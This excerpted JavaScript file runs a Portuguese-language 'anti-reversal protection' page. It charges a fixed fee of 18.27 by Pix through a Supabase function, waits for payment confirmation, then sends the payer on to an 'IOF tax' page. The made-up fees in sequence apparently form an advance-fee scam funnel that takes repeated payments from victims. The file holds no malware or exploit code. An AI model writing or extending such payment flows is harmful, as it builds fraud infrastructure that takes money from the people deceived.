// JavaScript para página de Proteção Anti-Reversão
...
if (typeof window.protecaoAntiReversaoSupabase === 'undefined') {
    window.protecaoAntiReversaoSupabase = null;
}

const PROTECTION_FEE = 18.27; // Taxa de proteção anti-reversão
...
async function createPixPayment(amount, payerName, pixKey, pixKeyType, supabaseClient = null) {
    try {
        const client = supabaseClient || window.protecaoAntiReversaoSupabase;
        if (!client) {
        ...
        const { data, error } = await client.functions.invoke('bright-api', {
            body: {
                amount: amount,
                description: 'Proteção anti-reversão de Pix',
                payerName: payerName,
                pixKey: pixKey,
...
function initSupabase() {
    if (window.supabase && !window.protecaoAntiReversaoSupabase) {
        try {
            window.protecaoAntiReversaoSupabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
                auth: {
    ...
    return window.protecaoAntiReversaoSupabase;
}
...
window.addEventListener('load', () => {
    ...
    // Atualizar valores
    const protectionFeeEl = document.getElementById('protectionFee');
    if (protectionFeeEl) {
        protectionFeeEl.textContent = formatCurrency(PROTECTION_FEE);
    }
    ...
    async function processPixPayment() {
        try {
            ...
            const paymentData = await createPixPayment(PROTECTION_FEE, params.name, params.pixKey, params.pixKeyType, supabaseClient);

            if (paymentData && paymentData.paymentId) {
                monitorPaymentConfirmation(paymentData.paymentId, (confirmation) => {
                    showPixConfirmed(() => {
                        const nextUrl = `imposto-iof.html?name=${encodeURIComponent(params.name)}&pixKey=${encodeURIComponent(params.pixKey)}&pixKeyType=${encodeURIComponent(params.pixKeyType)}`;
                        window.location.href = nextUrl;
                    });
                }, supabaseClient);

                showPixModal(paymentData, PROTECTION_FEE);
            } else {
    ...
    const activateProtectionBtn = document.getElementById('activateProtectionBtn');
    if (activateProtectionBtn) {
        activateProtectionBtn.addEventListener('click', processPixPayment);
    }
